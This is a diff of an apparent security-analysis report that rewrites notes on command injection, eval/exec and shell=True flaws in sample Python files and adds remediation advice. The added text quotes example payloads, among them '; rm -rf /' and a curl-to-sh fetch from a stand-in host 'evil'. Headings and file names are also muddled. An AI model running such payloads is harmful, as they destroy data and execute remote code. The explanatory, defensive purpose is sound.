@@ -1,17 +1,20 @@
 ### 2.1 "command_injection.py"
 
-theres basically a unsanitized variable being run in an os system call (on line 7)
-there is also the same vulnerability on line 10 and 13 where a user can use command injection to run malicous code on the execution of the porogram.
+The script contains a command injection vulnerability because it runs unsanitized variables inside os.system() calls. On line 7 variable1(cmd) does os.system(cmd), so any string supplied to cmd is passed straight to the shell. Similarly, line 10 (os.system("ls " + user)) and line 13 (os.system(f"echo {user}")) construct shell commands from the user variable. In all three cases an attacker who controls cmd or user can inject shell metacharacters (for example ;, &&, |, or backticks) to append or replace commands — e.g., supplying "; rm -rf /" or $(curl http://evil/payload | sh) would execute arbitrary commands with the program’s privileges. The root cause is treating untrusted input as code rather than data. Remediation options include avoiding os.system() for any user-controlled input, using subprocess.run() with an argument list and shell=False, validating or whitelisting allowed input patterns, or escaping/normalizing input before use.
+
 
 ### 2.2 "eval_exec.py"
 
-here too there is unsanitized input goign into the eval fuction on line 2 and 5 but not on line 8 as thats a constat thats been fixed in place in the code
+The eval_exec.py script is vulnerable to arbitrary code execution because it calls eval() and exec() on unsanitized input. In the sample, my_eval(expr) at line 2 calls eval(expr) and my_exec(code) at line 5 calls exec(code) — both evaluate whatever string is passed in, so if an attacker controls expr or code they can execute arbitrary Python statements (for example _import__('os').system('rm -rf /')). Line 8 (eval("1 + 2")) is safe because it evaluates a constant literal rather than external input. The underlying problem is treating untrusted data as executable code rather than parsed data. To fix this, avoid eval()/exec() on user-supplied strings; if you must parse simple data use ast.literal_eval() which only evaluates Python literals, or implement strict input validation/whitelisting and sandboxing. Where possible, refactor the code to use explicit parsing or dedicated APIs instead of dynamic evaluation.
+
 
 ### 2.3 "path_traversal.py"
 
-popen with the shell=True happens on lines 7, 13, 16 and 19 since this invokes the shell the uder can use command injection like how its being done on OS system calls
-however, of those commans only lines 7 (popen2) and 13 (popen4) are vulnerabiliteis as the lines 16 (popen5) and 19 (popen6) are constant variables that the user does not get to decide.
+The path_traversal.py (subprocess usage) snippet shows shell-injection risk where subprocess.Popen / subprocess.run are invoked with shell=True and command strings that include variable data. In the provided code, calls on lines 7 (popen2) and 13 (popen4) build commands from user-controlled variables and pass them to the shell — these are vulnerable because the shell will interpret metacharacters (e.g., ;, &&, |, $(...)) and an attacker could inject additional commands. The calls on lines 16 (popen5) and 19 (popen6) use only constant arguments and therefore do not present the same risk. The root cause is handing untrusted input to a shell-enabled subprocess; the safest fixes are to avoid shell=True when input is variable and instead call subprocess.run()/Popen() with a list of arguments (e.g., ["ls", user]) or to strictly validate/whitelist inputs before use. If shell=True is absolutely required, ensure robust input sanitization or escaping and consider running the command in a restricted environment to limit impact.
 
-### 2.3 "path_traversal.py"
 
-opener_concat on line 8, opener_join_var on line 16 and opener_join_varconst on line 20 both have path traversal vulnerabilities due to the unsaintezed use of the variables name and base beig used in the open() function
+### 2.3 "subprocess_pope.py"
+
+The subprocess_popen.py file demonstrates a command injection vulnerability caused by the use of subprocess.Popen() and subprocess.run() with the shell=True option. When shell=True is set, Python passes the provided command string to the system’s shell for interpretation, meaning special characters like ;, &&, or | can be used to chain malicious commands. In this code, popen2() (line 8) and popen4() (line 14) both combine untrusted user input with shell=True, allowing an attacker to inject and execute arbitrary commands. The other functions (popen1, popen3, popen5, popen6) either don’t use shell=True or use constant strings and are therefore not exploitable in the same way. The vulnerability arises from building command strings directly from user input without sanitization. To mitigate this, shell=True should be avoided whenever variable input is used. Instead, developers should use argument lists with shell=False, such as subprocess.run(["echo", user]), which executes commands safely without invoking a shell. Additionally, validating and sanitizing user input before execution further minimizes the risk of exploitation.
+
+
